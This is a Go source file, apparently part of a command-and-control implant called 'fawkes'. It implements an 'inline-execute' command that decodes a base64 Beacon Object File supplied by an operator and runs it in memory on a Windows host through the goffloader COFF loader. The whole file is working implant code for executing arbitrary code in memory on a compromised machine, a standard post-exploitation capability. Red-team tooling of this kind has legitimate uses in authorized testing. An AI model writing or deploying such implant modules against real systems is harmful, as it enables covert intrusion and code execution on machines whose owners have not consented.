//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/praetorian-inc/goffloader/src/coff"
	"github.com/praetorian-inc/goffloader/src/lighthouse"

	"fawkes/pkg/structs"
)

// InlineExecuteCommand implements the inline-execute command for BOF/COFF execution
type InlineExecuteCommand struct{}

// Name returns the command name
func (c *InlineExecuteCommand) Name() string {
	return "inline-execute"
}

// Description returns the command description
func (c *InlineExecuteCommand) Description() string {
	return "Execute a Beacon Object File (BOF/COFF) in memory"
}

// InlineExecuteParams represents the parameters for inline-execute
type InlineExecuteParams struct {
	BOFB64     string   `json:"bof_b64"`     // Base64-encoded BOF bytes
	EntryPoint string   `json:"entry_point"` // Entry point function name
	Arguments  []string `json:"arguments"`   // Arguments in format: ["zvalue", "i80"]
}

// Execute executes the inline-execute command
func (c *InlineExecuteCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse parameters
	var params InlineExecuteParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v\nRaw params: %s", err, task.Params),
			Status:    "error",
			Completed: true,
		}
	}

	// DEBUG: Log what we received
	debugInfo := fmt.Sprintf("[DEBUG] Entry point: %s\n[DEBUG] Arguments (%d): %v\n",
		params.EntryPoint, len(params.Arguments), params.Arguments)

	// Validate BOF data
	if params.BOFB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No BOF data provided",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode the base64-encoded BOF
	bofBytes, err := base64.StdEncoding.DecodeString(params.BOFB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding BOF data: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(bofBytes) == 0 {
		return structs.CommandResult{
			Output:    "Error: BOF data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// Pack the arguments using goffloader's lighthouse package
	var argBytes []byte
	if len(params.Arguments) > 0 {
		argBytes, err = lighthouse.PackArgs(params.Arguments)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error packing BOF arguments: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		// DEBUG: Show packed bytes
		debugInfo += fmt.Sprintf("[DEBUG] Packed args (%d bytes): %s\n", len(argBytes), hex.EncodeToString(argBytes))
	}

	// Execute the BOF using goffloader
	// goffloader handles output capture internally via channels
	entryPoint := params.EntryPoint
	if entryPoint == "" {
		entryPoint = "go"
	}

	bofOutput, err := coff.LoadWithMethod(bofBytes, argBytes, entryPoint)

	// Check for execution errors
	if err != nil {
		output := fmt.Sprintf("%s\nError executing BOF: %v", debugInfo, err)
		if bofOutput != "" {
			output += fmt.Sprintf("\n\nBOF Output:\n%s", bofOutput)
		}
		return structs.CommandResult{
			Output:    output,
			Status:    "error",
			Completed: true,
		}
	}

	// Clean up the output (remove trailing newlines)
	bofOutput = strings.TrimSpace(bofOutput)

	// Return the BOF output
	if bofOutput == "" {
		bofOutput = "[+] BOF executed successfully (no output)"
	}

	return structs.CommandResult{
		Output:    debugInfo + "\n" + bofOutput,
		Status:    "success",
		Completed: true,
	}
}
